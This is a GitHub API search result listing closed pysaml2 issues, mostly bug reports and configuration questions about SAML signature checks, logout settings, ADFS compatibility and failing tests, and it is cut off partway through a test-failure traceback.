{"total_count": 207, "incomplete_results": false, "items": [{"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/705", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/705/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/705/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/705/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/705", "id": 674248794, "node_id": "MDU6SXNzdWU2NzQyNDg3OTQ=", "number": 705, "title": "Can pysaml2 support multiple IDP SSO for one sp?", "user": {"login": "kashyap21", "id": 10625381, "node_id": "MDQ6VXNlcjEwNjI1Mzgx", "avatar_url": "https://avatars2.githubusercontent.com/u/10625381?v=4", "gravatar_id": "", "url": "https://api.github.com/users/kashyap21", "html_url": "https://github.com/kashyap21", "followers_url": "https://api.github.com/users/kashyap21/followers", "following_url": "https://api.github.com/users/kashyap21/following{/other_user}", "gists_url": "https://api.github.com/users/kashyap21/gists{/gist_id}", "starred_url": "https://api.github.com/users/kashyap21/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/kashyap21/subscriptions", "organizations_url": "https://api.github.com/users/kashyap21/orgs", "repos_url": "https://api.github.com/users/kashyap21/repos", "events_url": "https://api.github.com/users/kashyap21/events{/privacy}", "received_events_url": "https://api.github.com/users/kashyap21/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-08-06T11:42:29Z", "updated_at": "2020-08-07T21:50:11Z", "closed_at": "2020-08-07T21:50:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\n\r\n## Expected Behavior\r\n<!--- Tell us what should happen -->\r\n\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\n\r\n## Steps to Reproduce\r\n<!--- Provide a link to a live example, or an unambiguous set of steps to -->\r\n<!--- reproduce this bug. Include code to reproduce, if relevant -->\r\n1.\r\n2.\r\n3.\r\n4.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/703", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/703/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/703/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/703/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/703", "id": 658445432, "node_id": "MDU6SXNzdWU2NTg0NDU0MzI=", "number": 703, "title": "Signature error: Signature missing for response(IDP not signing SAMLResponse", "user": {"login": "HacKeD0x90", "id": 14231783, "node_id": "MDQ6VXNlcjE0MjMxNzgz", "avatar_url": "https://avatars0.githubusercontent.com/u/14231783?v=4", "gravatar_id": "", "url": "https://api.github.com/users/HacKeD0x90", "html_url": "https://github.com/HacKeD0x90", "followers_url": "https://api.github.com/users/HacKeD0x90/followers", "following_url": "https://api.github.com/users/HacKeD0x90/following{/other_user}", "gists_url": "https://api.github.com/users/HacKeD0x90/gists{/gist_id}", "starred_url": "https://api.github.com/users/HacKeD0x90/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/HacKeD0x90/subscriptions", "organizations_url": "https://api.github.com/users/HacKeD0x90/orgs", "repos_url": "https://api.github.com/users/HacKeD0x90/repos", "events_url": "https://api.github.com/users/HacKeD0x90/events{/privacy}", "received_events_url": "https://api.github.com/users/HacKeD0x90/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-07-16T18:26:11Z", "updated_at": "2020-07-16T20:25:29Z", "closed_at": "2020-07-16T20:25:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "i tried the example from  pysaml2-4.9.0, and when i force want_response_signed to True  i get this error\r\nSignature error: Signature missing for response(IDP not signing SAMLResponse \r\nas there is no signature in SAMLResponse, is there any extra configuration to make this example working with signature verification enabled?\r\n\r\nThanks", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/701", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/701/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/701/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/701/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/701", "id": 654786735, "node_id": "MDU6SXNzdWU2NTQ3ODY3MzU=", "number": 701, "title": "Multiple ways to get logout_requests_signed, are we using the correct one now?", "user": {"login": "dhensen", "id": 2786295, "node_id": "MDQ6VXNlcjI3ODYyOTU=", "avatar_url": "https://avatars1.githubusercontent.com/u/2786295?v=4", "gravatar_id": "", "url": "https://api.github.com/users/dhensen", "html_url": "https://github.com/dhensen", "followers_url": "https://api.github.com/users/dhensen/followers", "following_url": "https://api.github.com/users/dhensen/following{/other_user}", "gists_url": "https://api.github.com/users/dhensen/gists{/gist_id}", "starred_url": "https://api.github.com/users/dhensen/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/dhensen/subscriptions", "organizations_url": "https://api.github.com/users/dhensen/orgs", "repos_url": "https://api.github.com/users/dhensen/repos", "events_url": "https://api.github.com/users/dhensen/events{/privacy}", "received_events_url": "https://api.github.com/users/dhensen/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-07-10T13:33:29Z", "updated_at": "2020-07-11T12:54:53Z", "closed_at": "2020-07-10T19:02:58Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nIn b8539198 there was a change where `self.logout_requests_signed` was changed to `self.config.logout_requests_signed`.\r\nI'm wondering what the reason was other than the linter message in the commit message stating that \"E1101: Instance of 'Saml2Client' has no 'logout_requests_signed' member (no-member)\". If you see the saml2.client_base.Base constructor, you can see that a list of attribute_defaults are set as member vars. Probably a case of the linter not being smart enough.\r\n\r\nSo my claim is this: the old way worked just find (`self.logout_requests_signed`)\r\n\r\nLet's see why:\r\nThe `self.config.logout_requests_signed` uses the instance variable, this is obvious. But saml2.config.Config:load_special uses the `SPEC` dictionary to load your custom config given a context ('sp' in case of logout_requests_signed) resulting in a \"protected\" member var names `_sp_logout_requests_signed`. This differs from self.config.logout_requests_signed, which value is initialized to None.\r\n\r\nSo from my viewpoint this solves a linter issue, but introduced a bug that we are running into now.\r\n\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\n5.3.0\r\n\r\n## Expected Behavior\r\nGiven a custom config I expect the value of self.config.logout_requests_signed to be False, when I set logout_requests_signed to False in my custom config.\r\n\r\n## Current Behavior\r\nGiven a custom config where logout_requests_signed is set to False, the value of self.config.logout_requests_signed is None. My custom config is not propagated. (The code uses setattr with `sp` as context and sets it on var `_sp_logout_requests_signed` )\r\n\r\n## Possible Solution\r\n- Revert change.\r\n- Let there be only one way to access logout_requests_signed. Remove the member vars from Saml2Client and force us to use the Config object. OR Let it this way and proxy the dynamically set member vars to relevant entries in the Config object.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/695", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/695/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/695/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/695/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/695", "id": 645822946, "node_id": "MDU6SXNzdWU2NDU4MjI5NDY=", "number": 695, "title": "Question: Reading Identity Provider Issuer from SAML response", "user": {"login": "vahedq", "id": 4528652, "node_id": "MDQ6VXNlcjQ1Mjg2NTI=", "avatar_url": "https://avatars3.githubusercontent.com/u/4528652?v=4", "gravatar_id": "", "url": "https://api.github.com/users/vahedq", "html_url": "https://github.com/vahedq", "followers_url": "https://api.github.com/users/vahedq/followers", "following_url": "https://api.github.com/users/vahedq/following{/other_user}", "gists_url": "https://api.github.com/users/vahedq/gists{/gist_id}", "starred_url": "https://api.github.com/users/vahedq/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/vahedq/subscriptions", "organizations_url": "https://api.github.com/users/vahedq/orgs", "repos_url": "https://api.github.com/users/vahedq/repos", "events_url": "https://api.github.com/users/vahedq/events{/privacy}", "received_events_url": "https://api.github.com/users/vahedq/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-06-25T20:13:09Z", "updated_at": "2020-06-25T21:36:13Z", "closed_at": "2020-06-25T21:36:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nI am not sure if this is the right place to post a question, but hoping you can help.\r\n\r\nI have a multi-tenant system with multiple Identity providers and one ACS Endpoint (SP sign-in URL).\r\n\r\nTo create a SAML client and finish the auth flow, I'd need to look up the corresponding  metadata for the saml response in our DB. To do this, it seems like I need to first read the `issuer` from the saml response.\r\n\r\nIs there an easy way to read issuer from saml response with pysaml2?\r\n\r\nE.g.,\r\n```\r\n<saml2:Issuer \r\n     xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"\r\n     Format=\"urn:oasis:names:tc:SAML:2.0:nameid format:entity\">\r\n   http://www.okta.com/xyzxyzxyzxyzxyzxyz\r\n</saml2:Issuer>\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/693", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/693/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/693/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/693/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/693", "id": 639835541, "node_id": "MDU6SXNzdWU2Mzk4MzU1NDE=", "number": 693, "title": "make_metadata.py fails to generate signed metadata with Python 3", "user": {"login": "PurkkaKoodari", "id": 8439661, "node_id": "MDQ6VXNlcjg0Mzk2NjE=", "avatar_url": "https://avatars1.githubusercontent.com/u/8439661?v=4", "gravatar_id": "", "url": "https://api.github.com/users/PurkkaKoodari", "html_url": "https://github.com/PurkkaKoodari", "followers_url": "https://api.github.com/users/PurkkaKoodari/followers", "following_url": "https://api.github.com/users/PurkkaKoodari/following{/other_user}", "gists_url": "https://api.github.com/users/PurkkaKoodari/gists{/gist_id}", "starred_url": "https://api.github.com/users/PurkkaKoodari/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/PurkkaKoodari/subscriptions", "organizations_url": "https://api.github.com/users/PurkkaKoodari/orgs", "repos_url": "https://api.github.com/users/PurkkaKoodari/repos", "events_url": "https://api.github.com/users/PurkkaKoodari/events{/privacy}", "received_events_url": "https://api.github.com/users/PurkkaKoodari/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-06-16T17:09:20Z", "updated_at": "2020-07-07T09:46:50Z", "closed_at": "2020-07-07T09:46:50Z", "author_association": "NONE", "active_lock_reason": null, "body": "When using Python 3, `make_metadata.py` and the examples error out when trying to generate signed metadata.\r\n\r\nThe problem is that [`sign_entity_descriptor()`](https://github.com/IdentityPython/pysaml2/blob/master/src/saml2/metadata.py#L810) returns `str` (from a backend's [`sign_statement()`](https://github.com/IdentityPython/pysaml2/blob/master/src/saml2/sigver.py#L796), which calls `decode()` on the data), and then passes it to [`metadata_tostring_fix()`](https://github.com/IdentityPython/pysaml2/blob/master/src/saml2/metadata.py#L65), which expects it to be a `bytes` in Python 3.\r\n\r\n## Code Version\r\nAt least 5.0.0, 5.1.0 and current master are affected.\r\n\r\n## Expected Behavior\r\nIt should not crash.\r\n\r\n## Current Behavior\r\n```\r\nTraceback (most recent call last):\r\n  File \"./sp.py\", line 830, in metadata\r\n    _args.sign,\r\n  File \"/home/asdf/pysaml2/venv/lib/python3.7/site-packages/pysaml2-5.1.0-py3.7.egg/saml2/metadata.py\", line 113, in create_metadata_string\r\n    return metadata_tostring_fix(eid, nspair, xmldoc)\r\n  File \"/home/asdf/pysaml2/venv/lib/python3.7/site-packages/pysaml2-5.1.0-py3.7.egg/saml2/metadata.py\", line 73, in metadata_tostring_fix\r\n    if b\"\\\"xs:string\\\"\" in xmlstring and bXMLNSXS not in xmlstring:\r\nTypeError: 'in <string>' requires string as left operand, not bytes\r\n```\r\n\r\n## Possible Solution\r\n\r\nThe backwards-compatible change would probably be to make `metadata_tostring_fix()` accept `str` for Python 3.\r\n\r\nThe library contains two uses of that function, in `make_metadata.py` and `create_metadata_string()`, both after a call to `sign_entity_descriptor()`. However, in case someone is using `metadata_tostring_fix()` externally, it might be a good idea to make it allow both `bytes` and `str`.\r\n\r\n## Steps to Reproduce\r\n1. Run the `sp-wsgi` example using Python 3.\r\n2. Access `http://localhost:8087/metadata`.\r\n3. Observe the error message in the console.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/692", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/692/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/692/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/692/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/692", "id": 636416461, "node_id": "MDU6SXNzdWU2MzY0MTY0NjE=", "number": 692, "title": "Version 5.1.0 is not backwards compatibility with Microsoft ADFS", "user": {"login": "peterfarrell", "id": 2857188, "node_id": "MDQ6VXNlcjI4NTcxODg=", "avatar_url": "https://avatars0.githubusercontent.com/u/2857188?v=4", "gravatar_id": "", "url": "https://api.github.com/users/peterfarrell", "html_url": "https://github.com/peterfarrell", "followers_url": "https://api.github.com/users/peterfarrell/followers", "following_url": "https://api.github.com/users/peterfarrell/following{/other_user}", "gists_url": "https://api.github.com/users/peterfarrell/gists{/gist_id}", "starred_url": "https://api.github.com/users/peterfarrell/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/peterfarrell/subscriptions", "organizations_url": "https://api.github.com/users/peterfarrell/orgs", "repos_url": "https://api.github.com/users/peterfarrell/repos", "events_url": "https://api.github.com/users/peterfarrell/events{/privacy}", "received_events_url": "https://api.github.com/users/peterfarrell/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 12, "created_at": "2020-06-10T17:14:54Z", "updated_at": "2020-06-23T14:41:53Z", "closed_at": "2020-06-16T17:47:38Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\nUpgrading from 5.0.0 to 5.1.0 without configuration changes to PySAML breaks connectivity using Microsoft ADFS. We are unsure what was added in 5.1.0 that causes this backwards compatibility issue other than it's related to `samlp:Extensions`.\r\n\r\n## Code Version\r\n5.1.0 and 5.0.0\r\n\r\n## Expected Behavior\r\nThat 5.1.0 is backwards compatible with 5.0.0 or otherwise document an upgrade strategy.\r\n\r\n## Current Behavior\r\nWhen authenticating against MS ADFS using PySAML2 5.1.0, this the error that is logged in ADFS and the authentication fails.  Downgrading to PySAML2 5.0.0 fixes the issue.\r\n\r\n```bash\r\nException details:\r\nSystem.Xml.XmlException: MSIS0009: The <samlp:Extensions> element was encountered. To accept extensions, you must extend the SamlProtocolSerializer.\r\n  at Microsoft.IdentityServer.Protocols.Saml.SamlProtocolSerializer.ReadExtensions(XmlReader reader, SamlMessage message)\r\n   at Microsoft.IdentityServer.Protocols.Saml.SamlProtocolSerializer.ReadCommonElements(XmlReader reader, SamlMessage message)\r\n   at Microsoft.IdentityServer.Protocols.Saml.SamlProtocolSerializer.ReadAuthnRequest(XmlReader reader)\r\n   at Microsoft.IdentityServer.Protocols.Saml.HttpSamlBindingSerializer.ReadProtocolMessage(String encodedSamlMessage)\r\n   at Microsoft.IdentityServer.Protocols.Saml.HttpSamlBindingSerializer.CreateFromNameValueCollection(Uri baseUrl, NameValueCollection collection)\r\n   at Microsoft.IdentityServer.Protocols.Saml.HttpRedirectSamlBindingSerializer.ReadMessage(Uri requestUrl, NameValueCollection form)\r\n   at Microsoft.IdentityServer.Web.Protocols.Saml.HttpSamlMessageFactory.CreateMessage(WrappedHttpListenerRequest httpRequest)\r\n   at Microsoft.IdentityServer.Web.Protocols.Saml.SamlContextFactory.CreateProtocolContextFromRequest(WrappedHttpListenerRequest request, ProtocolContext& protocolContext)\r\n   at Microsoft.IdentityServer.Web.Protocols.Saml.SamlProtocolHandler.CreateProtocolContext(WrappedHttpListenerRequest request)\r\n   at Microsoft.IdentityServer.Web.PassiveProtocolListener.GetProtocolHandler(WrappedHttpListenerRequest request, ProtocolContext& protocolContext, PassiveProtocolHandler& protocolHandler)\r\n   at Microsoft.IdentityServer.Web.PassiveProtocolListener.OnGetContext(WrappedHttpListenerContext context)\r\n```\r\n\r\n## Possible Solution\r\nDocument what has changed between versions 5.0.0 and 5.1.0 that causes this.\r\n\r\n## Steps to Reproduce\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/690", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/690/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/690/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/690/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/690", "id": 623535553, "node_id": "MDU6SXNzdWU2MjM1MzU1NTM=", "number": 690, "title": "OneLogin response causes \"Signature missing for assertion\" error even though assertions are signed", "user": {"login": "matt-martin", "id": 956900, "node_id": "MDQ6VXNlcjk1NjkwMA==", "avatar_url": "https://avatars2.githubusercontent.com/u/956900?v=4", "gravatar_id": "", "url": "https://api.github.com/users/matt-martin", "html_url": "https://github.com/matt-martin", "followers_url": "https://api.github.com/users/matt-martin/followers", "following_url": "https://api.github.com/users/matt-martin/following{/other_user}", "gists_url": "https://api.github.com/users/matt-martin/gists{/gist_id}", "starred_url": "https://api.github.com/users/matt-martin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/matt-martin/subscriptions", "organizations_url": "https://api.github.com/users/matt-martin/orgs", "repos_url": "https://api.github.com/users/matt-martin/repos", "events_url": "https://api.github.com/users/matt-martin/events{/privacy}", "received_events_url": "https://api.github.com/users/matt-martin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-23T00:49:08Z", "updated_at": "2020-05-23T21:45:59Z", "closed_at": "2020-05-23T21:45:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\n5.0.0\r\n\r\n## Expected Behavior\r\nAssertion signature should be validated when \"want_assertions_signed\" is true and OneLogin provides signed assertions\r\n\r\n## Current Behavior\r\nAssertion signature is not found when \"want_assertions_signed\" is true and OneLogin provides signed assertions\r\n\r\n## Possible Solution\r\nI don't really know why this is happening, but here's the stack:\r\n\r\n```\r\nTraceback:\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/django/core/handlers/exception.py\" in inner\r\n  34.             response = get_response(request)\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/django/core/handlers/base.py\" in _get_response\r\n  126.                 response = self.process_exception_by_middleware(e, request)\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/django/core/handlers/base.py\" in _get_response\r\n  124.                 response = wrapped_callback(request, *callback_args, **callback_kwargs)\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/django/views/decorators/csrf.py\" in wrapped_view\r\n  54.         return view_func(*args, **kwargs)\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/django_saml2_auth/views.py\" in acs\r\n  159.         resp, entity.BINDING_HTTP_POST)\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/client_base.py\" in parse_authn_request_response\r\n  714.                                         binding, **kwargs)\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/entity.py\" in _parse_response\r\n  1196.             response = response.verify(keys)\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\" in verify\r\n  1051.         if self.parse_assertion(keys):\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\" in parse_assertion\r\n  937.                 if not self._assertion(assertion, False):\r\n\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\" in _assertion\r\n  795.                 raise SignatureError(\"Signature missing for assertion\")\r\n\r\nException Type: SignatureError at /saml2_auth/acs/\r\nException Value: Signature missing for assertion\r\n```\r\n\r\n## Steps to Reproduce\r\n1. Set the following config:\r\n\r\n```\r\n                'allow_unsolicited': True,\r\n                'authn_requests_signed': False,\r\n                'logout_requests_signed': True,\r\n                'want_assertions_signed': True,\r\n                'want_response_signed': False,\r\n```\r\n2. Try to parse the sample responses provided by OneLogin [here](https://developers.onelogin.com/saml/examples/response). Specifically, the \"SAML Response with Signed Assertion\" response.\r\n\r\n\r\nThanks in advance for any help you may be able to provide.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/688", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/688/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/688/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/688/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/688", "id": 619520507, "node_id": "MDU6SXNzdWU2MTk1MjA1MDc=", "number": 688, "title": "Use of PasswordProtectedTransport in the request", "user": {"login": "Ptr32Void", "id": 7305357, "node_id": "MDQ6VXNlcjczMDUzNTc=", "avatar_url": "https://avatars1.githubusercontent.com/u/7305357?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Ptr32Void", "html_url": "https://github.com/Ptr32Void", "followers_url": "https://api.github.com/users/Ptr32Void/followers", "following_url": "https://api.github.com/users/Ptr32Void/following{/other_user}", "gists_url": "https://api.github.com/users/Ptr32Void/gists{/gist_id}", "starred_url": "https://api.github.com/users/Ptr32Void/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Ptr32Void/subscriptions", "organizations_url": "https://api.github.com/users/Ptr32Void/orgs", "repos_url": "https://api.github.com/users/Ptr32Void/repos", "events_url": "https://api.github.com/users/Ptr32Void/events{/privacy}", "received_events_url": "https://api.github.com/users/Ptr32Void/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2020-05-16T17:29:20Z", "updated_at": "2020-05-18T09:08:57Z", "closed_at": "2020-05-18T09:08:36Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\n\r\nI am struggling to understand how to configure pysaml2 and add the RequestedAuthnContext in my requests. I have a SP and I would need to add the following SAML assertions in my request during the login:\r\n\r\n`\r\n<samlp:RequestedAuthnContext> \r\n<saml:AuthnContextClassRef>\r\nurn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\r\n</saml:AuthnContextClassRef> \r\n</samlp:RequestedAuthnContext>\r\n`\r\n\r\nI am struggling because I cannot see a configuration to apply these assertions.\r\nI tried to implement it in different ways in the code but I cannot make it work.\r\nI believe this is possible as I can see it from here:\r\nhttps://github.com/IdentityPython/pysaml2/blob/master/src/saml2/samlp.py\r\n\r\nI can see:\r\n`\r\nAUTHN_PASSWORD = \"urn:oasis:names:tc:SAML:2.0:ac:classes:Password\"\r\nAUTHN_PASSWORD_PROTECTED = \\\r\n    \"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\"\r\n`\r\n\r\nI also saw a test here: https://github.com/IdentityPython/pysaml2/blob/f22506ed9ffb737e6e26942fa5d3f3ba851c0a87/tests/test_77_authn_context.py#L68\r\n\r\n\r\nI just do not know how to reference that unfortunately. I have a simple configuration like this:\r\n\r\n\"service\": {\r\n        \"sp\": {\r\n            \"name\": \"BLABLA\",\r\n            \"allow_unsolicited\": true,\r\n            \"want_response_signed\": false,\r\n            \"logout_requests_signed\": true,\r\n            \"endpoints\": {\r\n                \"assertion_consumer_service\": [\"https://mywebste...\"],\r\n                \"single_logout_service\": [[\"https://mywebste...\", \"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect\"]]\r\n            }\r\n        }\r\n    }\r\n\r\nAnybody knows how to perform that request using the \"saml:AuthnContextClassRef\"?\r\n\r\nThanks.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/682", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/682/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/682/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/682/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/682", "id": 612788733, "node_id": "MDU6SXNzdWU2MTI3ODg3MzM=", "number": 682, "title": "Eight tests fail while building the package on i586", "user": {"login": "mcepl", "id": 198999, "node_id": "MDQ6VXNlcjE5ODk5OQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/198999?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mcepl", "html_url": "https://github.com/mcepl", "followers_url": "https://api.github.com/users/mcepl/followers", "following_url": "https://api.github.com/users/mcepl/following{/other_user}", "gists_url": "https://api.github.com/users/mcepl/gists{/gist_id}", "starred_url": "https://api.github.com/users/mcepl/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mcepl/subscriptions", "organizations_url": "https://api.github.com/users/mcepl/orgs", "repos_url": "https://api.github.com/users/mcepl/repos", "events_url": "https://api.github.com/users/mcepl/events{/privacy}", "received_events_url": "https://api.github.com/users/mcepl/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-05-05T17:58:06Z", "updated_at": "2020-05-26T12:56:09Z", "closed_at": "2020-05-26T12:56:09Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\nReleased version 5.0.0 from package at https://github.com/IdentityPython/pysaml2/archive/v5.0.0.tar.gz (no patches), Python 3.8 from the openSUSE standard packages\r\n\r\n## Expected Behavior\r\nTests should pass without a fail\r\n\r\n## Current Behavior\r\n```\r\n[  200s] =================================== FAILURES ===================================\r\n[  200s] _______________________ test_assertion_consumer_service ________________________\r\n[  200s] \r\n[  200s]     def test_assertion_consumer_service():\r\n[  200s]         c = IdPConfig()\r\n[  200s]         c.load_file(dotname(\"idp_conf\"))\r\n[  200s]         c.context = \"idp\"\r\n[  200s]     \r\n[  200s]         c.metadata.load(\"local\", full_path(\"InCommon-metadata.xml\"))\r\n[  200s]     \r\n[  200s]         entity_id = \"https://www.zimride.com/shibboleth\"\r\n[  200s] >       acs = c.metadata.assertion_consumer_service(entity_id)\r\n[  200s] \r\n[  200s] tests/test_31_config.py:401: \r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1199: in assertion_consumer_service\r\n[  200s]     return self.service(entity_id, \"spsso_descriptor\",\r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] \r\n[  200s] self = <saml2.mdstore.MetadataStore object at 0xb4f08e38>\r\n[  200s] entity_id = 'https://www.zimride.com/shibboleth', typ = 'spsso_descriptor'\r\n[  200s] service = 'assertion_consumer_service'\r\n[  200s] binding = 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST'\r\n[  200s] \r\n[  200s]     def service(self, entity_id, typ, service, binding=None):\r\n[  200s]         known_entity = False\r\n[  200s]         logger.debug(\"service(%s, %s, %s, %s)\", entity_id, typ, service,\r\n[  200s]                      binding)\r\n[  200s]         for key, _md in self.metadata.items():\r\n[  200s]             srvs = _md.service(entity_id, typ, service, binding)\r\n[  200s]             if srvs:\r\n[  200s]                 return srvs\r\n[  200s]             elif srvs is None:\r\n[  200s]                 pass\r\n[  200s]             else:\r\n[  200s]                 known_entity = True\r\n[  200s]     \r\n[  200s]         if known_entity:\r\n[  200s]             logger.error(\"Unsupported binding: %s (%s)\", binding, entity_id)\r\n[  200s]             raise UnsupportedBinding(binding)\r\n[  200s]         else:\r\n[  200s]             logger.error(\"Unknown system entity: %s\", entity_id)\r\n[  200s] >           raise UnknownSystemEntity(entity_id)\r\n[  200s] E           saml2.s_utils.UnknownSystemEntity: 